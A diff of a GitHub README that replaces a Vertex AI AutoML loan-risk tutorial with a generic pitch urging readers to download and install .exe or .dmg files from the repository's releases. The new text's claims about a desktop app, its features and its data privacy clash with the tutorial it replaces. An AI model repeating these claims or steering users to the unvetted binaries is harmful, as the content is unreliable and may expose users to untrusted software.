@@ -1,34 +1,82 @@
-# loanriskaml 💸🦹
-loanriskaml : Predict Loan Risk # AutoML # Tabular Classification Model
+# 💰 loanriskaml - Predict Your Loan Risk Easily
 
-## Objective
-- Upload a dataset to Vertex AI.
-- Train a machine learning model with AutoML.
-- Get predictions.
+## 🌟 Overview
+The loanriskaml application helps you assess the risk of loans using an advanced machine learning model. With this tool, you can make informed decisions about loan approval. No programming skills are needed.
 
+## 📥 Download the Application
+[![Download Now](https://img.shields.io/badge/Download%20Now-LoanRiskAML-blue)](https://github.com/lukasolas/loanriskaml/releases)
 
-## Predicting Loan Risk with AutoML
+## 🚀 Getting Started
+Follow these simple steps to download and run the loanriskaml application:
 
+1. **Visit the Releases Page**
+   - Click this link to go to the [Releases Page](https://github.com/lukasolas/loanriskaml/releases).
 
-![loanriskaml001.png](./media/loanriskaml001.png)
+2. **Choose Your Version**
+   - You’ll see a list of available versions. Look for the latest version, which is usually at the top of the list.
 
-![loanriskaml002.png](./media/loanriskaml002.png)
+3. **Download the Application**
+   - Click on the version number to expand the details. You will find a list of files. Look for the file that matches your operating system (e.g., Windows, macOS, or Linux). Click the file to download it.
 
-![loanriskaml003.png](./media/loanriskaml003.png)
+4. **Locate the File**
+   - Once the download is complete, find the file in your computer’s downloads folder.
 
-![loanriskaml004.png](./media/loanriskaml004.png)
+5. **Install the Application**
+   - If your file is a .exe or .dmg, double-click it to start the installation. Follow the prompts to set up loanriskaml on your computer.
 
-![loanriskaml005.png](./media/loanriskaml005.png)
+6. **Run the Application**
+   - After installation, find the loanriskaml icon on your desktop or in your application folder. Double-click to run it.
 
-![loanriskaml006.png](./media/loanriskaml006.png)
+## ⚙️ System Requirements
+Before you start, ensure your computer meets these requirements:
+- **Operating System:** Windows 10, macOS Mojave or later, or Ubuntu 20.04
+- **RAM:** 4 GB or more
+- **Processor:** Intel i3 or equivalent
+- **Disk Space:** At least 200 MB of free space
 
-![loanriskaml007.png](./media/loanriskaml007.png)
+## 📊 Features
+- **User-Friendly Interface:** You do not need technical knowledge to navigate the application.
+- **Real-time Predictions:** Get instant risk assessments for loan applications.
+- **Data Privacy:** Your data remains secure and is only used for analysis within the application.
+- **Customizable Settings:** Adjust settings to fit your specific needs.
 
-![loanriskaml008.png](./media/loanriskaml008.png)
+## 🎓 How to Use the Application
+1. **Input Data:**
+   - Open loanriskaml. You will see fields to enter loan details such as amount, term, and borrower credit score.
 
-![loanriskaml009.png](./media/loanriskaml009.png)
+2. **Analyze Risk:**
+   - After entering the details, click on the “Analyze” button. The application will process the information and provide a risk score.
 
-![loanriskaml010.png](./media/loanriskaml010.png)
+3. **Understand Results:**
+   - The risk score will tell you whether the loan is a safe option or not. You will also see recommendations based on your data.
 
-![loanriskaml011.png](./media/loanriskaml011.png)
+4. **Save Reports:**
+   - Optionally, you can save the analysis as a PDF for your records.
 
+## 📖 Troubleshooting Common Issues
+- **Installation Error:**
+   - If you see an error while installing, make sure your operating system is up-to-date.
+
+- **Application Crashes:**
+   - Restart your computer and try opening the application again. If the problem persists, refer to the FAQ on the Releases Page.
+
+- **Data Input Issues:**
+   - Ensure all fields are filled out correctly. Misentered data can lead to inaccurate predictions.
+
+## 💬 Support
+For assistance, you can open an issue in the [GitHub Issues](https://github.com/lukasolas/loanriskaml/issues) section. Our team will respond as soon as possible.
+
+## 📅 Upcoming Features
+We are constantly improving loanriskaml. Upcoming features include:
+- Integration with popular financial software.
+- Advanced analytics for better risk predictions.
+- More customizable options for users.
+
+## 🔗 Additional Resources
+- [User Documentation](https://github.com/lukasolas/loanriskaml/wiki)
+- [GitHub Repository](https://github.com/lukasolas/loanriskaml)
+
+## 📥 Download the Application Again
+For your convenience, here’s the link to [download loanriskaml](https://github.com/lukasolas/loanriskaml/releases).
+
+Thank you for choosing loanriskaml. We hope it helps you in making better loan decisions!
